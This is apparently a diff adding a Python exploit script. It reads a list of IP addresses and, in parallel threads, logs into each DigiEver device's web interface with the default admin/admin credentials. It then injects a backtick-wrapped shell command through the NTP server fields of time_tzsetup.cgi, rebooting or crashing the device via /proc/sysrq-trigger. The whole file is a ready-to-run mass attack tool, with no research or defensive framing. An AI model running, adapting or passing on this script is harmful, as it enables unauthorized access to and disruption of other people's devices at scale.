@@ -1,0 +1,71 @@
+import threading
+import httpx
+
+class Main:
+    def __init__(self, ip):
+        self.ip = ip
+        self.execmsg = ""
+
+    def login(self):
+        try:
+            with httpx.Client(verify=False, timeout=120, follow_redirects=True) as client:
+                headers = {
+                    "Host": self.ip,
+                    "Content-Length": "127",
+                    "Cache-Control": "max-age=0",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Upgrade-Insecure-Requests": "1",
+                    "Origin": f"http://{self.ip}",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Referer": f"http://{self.ip}/",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Cookie": "PAGE=2; lang=en-us",
+                    "Connection": "keep-alive"       
+                }
+                login_data = "sUserName=admin&UserPassWD=admin&button0=Log+in&cgiName=login.cgi&page=%2Findex.htm&action=none&userName=admin&userPasswd=admin"
+                req = client.post(f"http://{self.ip}/login.cgi/cgi_main.cgi", data=login_data, headers=headers)
+                if req.status_code == 200:
+                    print(f"Logged into -> {self.ip}")
+                    self.exploit(client)
+                else:
+                    print(f"Failed to log into {self.ip}: {req.status_code}")
+        except Exception as e:
+            print(f"Error during login for {self.ip}: {e}")
+
+    def exploit(self, client):
+        try:
+            payloads = [
+                'reboot%3Becho+c+%3E+%2Fproc%2Fsysrq-trigger'
+            ]
+            headers = {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36',
+                'Referer': f'https://{self.ip}/cfg_system_time.htm',
+                'Accept': '*/*',
+                'Upgrade-Insecure-Requests': '1',
+                'Origin': f'http://{self.ip}',                               
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'en-US',
+            }
+            for pay in payloads:
+                data = f"cgiName=time_tzsetup.cgi&page=%2Fcfg_system_time.htm&id=69&ntp=%60{pay}%60&ntp1=time.stdtime.gov.tw&ntp2=%60{pay}%60&isEnabled=0&timeDiff=%2B9&ntpAutoSync=1&ntpSyncMode=1&day=0&hour=0&min=0&syncDiff=30"
+                req = client.post(f"http://{self.ip}/cgi-bin/cgi_main.cgi", headers=headers, data=data)
+                if req.status_code == 200:
+                    print(f"[digiever] Successfully exploited: {self.ip}")
+                else:
+                    print(f"Exploit failed for {self.ip}: {req.status_code}")
+        except Exception as e:
+            print(f"Error during exploit for {self.ip}: {e}")
+
+if __name__ == "__main__":
+    with open("digi.txt") as file:
+        threads = []
+        for ip in file.read().splitlines():
+            thread = threading.Thread(target=Main(ip).login)
+            threads.append(thread)
+            thread.start()
+        
+        for thread in threads:
+            thread.join()
